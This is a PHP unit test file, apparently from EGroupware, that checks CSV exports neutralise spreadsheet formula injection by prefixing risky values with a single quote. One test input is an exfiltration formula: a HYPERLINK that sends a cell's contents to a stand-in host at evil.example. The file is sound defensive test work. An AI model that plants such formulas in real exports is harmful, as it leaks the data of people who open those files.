<?php
/**
 * EGroupware importexport: regression test for CSV formula injection neutralization
 *
 * @link http://www.egroupware.org
 * @package importexport
 * @license http://opensource.org/licenses/gpl-license.php GPL - GNU General Public License
 */

require_once realpath(__DIR__.'/../../api/tests/AppTest.php');

/**
 * importexport_export_csv::fputcsv() used to serialize field values verbatim (quoting/escaping
 * only), so a value starting with '=', '+', '-', '@', TAB or CR is opened by Excel/LibreOffice as
 * a live spreadsheet formula rather than plain text (OWASP CSV Injection) - a victim with export
 * rights who opens the export could trigger data exfiltration (eg. HYPERLINK()) or phishing content
 * rendered as trusted data. Fix: prefix any such value with a leading single quote, which both
 * Excel and LibreOffice treat as "force this cell to plain text".
 *
 * Exercises the real protected fputcsv() method via Reflection (no DB/record setup needed - it's a
 * pure string-building method), through a real importexport_export_csv instance for a correctly
 * initialized $this->translation/$this->csv_charset.
 */
class ExportCsvFormulaInjectionTest extends \EGroupware\Api\AppTest
{
	private function fputcsv(array $row): string
	{
		$stream = fopen('php://memory', 'w+');
		try
		{
			$csv = new importexport_export_csv($stream, ['charset' => 'utf-8', 'appname' => 'infolog']);
			$method = new ReflectionMethod($csv, 'fputcsv');
			$method->setAccessible(true);
			$method->invoke($csv, $stream, $row, ',', '"');

			rewind($stream);
			return stream_get_contents($stream);
		}
		finally
		{
			fclose($stream);
		}
	}

	public static function formulaPrefixes(): array
	{
		return [
			'equals' => ['=HYPERLINK("https://evil.example/s?d="&A1,"Q3 figures")'],
			'plus' => ['+1+1'],
			'minus' => ['-1+1'],
			'at' => ['@SUM(1,1)'],
			'tab' => ["\tsneaky"],
			'carriage return' => ["\rsneaky"],
		];
	}

	#[\PHPUnit\Framework\Attributes\DataProvider('formulaPrefixes')]
	public function testFormulaPrefixedValueGetsNeutralized(string $payload)
	{
		$line = $this->fputcsv([$payload]);

		$this->assertStringStartsWith('"\'', $line,
			'a leading '.var_export($payload[0], true).' must be neutralized with a leading single quote');
		// fputcsv() also CSV-escapes embedded '"' as '""' - apply the same transform to the
		// expected value, rather than the raw original, so this only checks nothing besides the
		// quote-prefix changed
		$expected = "'".str_replace('"', '""', $payload);
		$this->assertStringContainsString($expected, $line,
			'the original value must still be present (just prefixed), not altered or dropped');
	}

	public function testOrdinaryValueIsUnaffected()
	{
		$line = $this->fputcsv(['Ordinary Name']);

		$this->assertStringStartsWith('"Ordinary', $line,
			'a value with no formula-prefix character must not gain a leading quote');
	}

	/**
	 * '=' appearing anywhere OTHER than the first character is normal, legitimate data (eg. an
	 * email address local-part, a URL query string) and must not be touched.
	 */
	public function testFormulaCharacterNotAtStartIsUnaffected()
	{
		$line = $this->fputcsv(['name=value']);

		$this->assertStringStartsWith('"name=value', $line);
	}
}
